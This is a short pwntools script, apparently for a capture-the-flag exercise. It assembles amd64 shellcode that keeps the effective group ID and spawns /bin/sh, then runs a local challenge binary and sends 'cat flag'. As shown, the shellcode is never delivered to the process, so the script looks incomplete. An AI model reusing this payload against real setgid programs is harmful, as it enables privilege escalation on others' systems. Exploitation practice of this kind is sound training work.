from pwn import *
from pwn import asm, context, gdb, process
context.clear(arch="amd64")
context.terminal = ["tmux", 'splitw','-h']
context.log_level = "DEBUG"
shellcode = asm(
    """
/* setregid(getegid(), getegid()) */
xor     eax, eax          /* RAX=0 (clear high bits before 8-bit write) */
mov     al, 108           /* getegid */
syscall                   /* RAX <- egid */
mov     rdi, rax          /* rgid = egid */
mov     rsi, rax          /* egid = egid */
xor     eax, eax
mov     al, 114           /* setregid */
syscall

/* execve("/bin/sh", 0, 0) */
    /* Build "/bin//sh\0" on stack, take its address as filename */
xor     eax, eax
push    rax               /* NUL */
mov     rbx, 0x68732f2f6e69622f   /* "/bin//sh" little-endian bytes */
push    rbx
mov     rdi, rsp          /* filename */
xor     esi, esi          /* argv = 0 */
xor     edx, edx          /* envp = 0 */
mov     al, 59            /* execve */
syscall
"""
)
outpath = os.path.abspath("shellcode.bin")
with open("shellcode.bin", "wb") as f:
    f.write(shellcode)
p = process(['./06-ascii-shellcode-64'])
# p.interactive()
p.sendline(b"cat flag")
p.recvline()
print(p.recvline().decode())
